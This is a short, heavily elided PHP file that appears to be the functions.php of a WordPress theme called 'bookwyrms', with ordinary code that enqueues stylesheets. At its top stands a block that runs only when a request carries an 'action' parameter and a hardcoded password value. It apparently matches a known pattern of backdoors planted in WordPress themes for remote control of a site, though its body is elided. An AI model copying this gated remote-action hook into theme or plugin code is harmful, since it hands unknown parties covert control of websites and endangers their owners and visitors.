<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '46fb0b3a144f70a76c301810d512a3b3'))
	{
...
function bookwyrms_enqueue_styles() {
...
add_action( 'wp_enqueue_scripts', 'bookwyrms_enqueue_styles' );
?>
